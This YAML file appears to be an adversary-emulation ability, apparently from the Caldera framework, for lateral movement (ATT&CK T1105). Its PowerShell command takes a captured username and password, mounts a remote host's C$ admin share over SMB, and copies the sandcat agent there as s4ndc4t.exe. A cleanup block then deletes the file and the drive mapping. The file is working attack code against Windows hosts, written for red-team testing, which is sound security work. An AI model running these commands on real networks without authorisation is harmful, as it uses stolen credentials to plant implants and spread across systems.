---

- id: bf1f4169-e387-48b2-8d50-f9dc218d3c94
  name: Copy 54ndc47 (SMB) 
  description: Copy 54ndc47 to remote host (SMB)
  tactic: lateral-movement
  technique:
    attack_id: T1105
    name: Remote File Copy
  platforms:
    windows:
      psh:
        command: |
          $username = "#{host.user.name}";
          $password = "#{host.user.password}";
          $secstr = New-Object -TypeName System.Security.SecureString;
          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
          $path = "sandcat.go-windows";
          $drive = "#{remote.host.fqdn}".replace(".","_");
          if (Get-PSDrive $drive -ErrorAction SilentlyContinue) {
          	Write-Host 'Using pre-existing $drive'
          } else {
            New-PSDrive -Name $drive -PSProvider FileSystem -Root "\\#{remote.host.fqdn}\C$" -Credential $cred;
          }
          Copy-Item -Path $path -Destination $drive":\Users\Public\s4ndc4t.exe";
        payload: sandcat.go-windows
        cleanup: |
          $drive = "#{remote.host.fqdn}".replace(".","_");
          if (Get-PSDrive $drive -ErrorAction SilentlyContinue) {
          	Write-Host 'Using pre-existing $drive'
          } else {
            $username = "#{host.user.name}";
            $password = "#{host.user.password}";
            $secstr = New-Object -TypeName System.Security.SecureString;
            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
            New-PSDrive -Name $drive -PSProvider FileSystem -Root "\\#{remote.host.fqdn}\C$" -Credential $cred;
          }
          Remove-Item -Path $drive":\Users\Public\s4ndc4t.exe" -Force;
          Remove-PSDrive -Name $drive;
  requires:
     - '#{host.user.name},has_password,#{host.user.password}'
